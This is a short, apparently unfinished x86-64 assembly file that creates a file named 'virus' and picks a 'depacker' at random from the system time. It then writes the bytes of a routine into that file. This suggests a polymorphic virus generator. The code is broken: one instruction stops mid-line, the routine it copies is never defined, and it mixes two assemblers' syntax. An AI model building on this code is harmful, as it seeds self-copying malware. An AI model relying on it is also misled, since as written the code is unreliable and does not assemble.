section	.text

global	main
extern	printf

_filename:
	.string db 'virus', 0
	.length equ $ - _filename

main:
	enter	32, 0

_open_file:
	;; Open target file
	mov		rax, 2							; open syscall
	lea		rdi, [rel _filename.string]		; file name
	mov		rsi, 578						; O_RDWR | O_CREAT | O_TRUNC
	mov		rdx, 0666						; 0666 permissions
	syscall
	cmp		rax, -1							; check fd
	je		_end							; return
	mov		qword [rsp], rax				; save fd

	;; Select depacker based on gettimeofday
	mov		rax, 96							; gettimeofday syscall
	lea		rdi, [rsp + 8]					; struct timeval *tv
	mov		rsi, 0
	syscall
	cmp		rax, -1
	je		_close_file
	xor		rdx, rdx
	mov		rax, qword [rsp + 8]
	mov		rcx, 10
	div		rcx
	mov		rax, rdx						; random number

	lea		rdi, [rsp + 8]
	mov		byte [rdi], 

	;; Write function
	lea		rdi, [rel _fn1]
	lea		rsi, [rel _fn1_end + 2]
	sub		rsi, rdi
	mov		rdx, rsi
	mov		rax, 1
	mov		rdi, qword [rsp]
	lea		rsi, [rel _fn1]
	syscall

_close_file:
	mov		rax, 3
	mov		rdi, qword [rsp]
	syscall

_end:
	mov		rax, 0
	leave
	ret
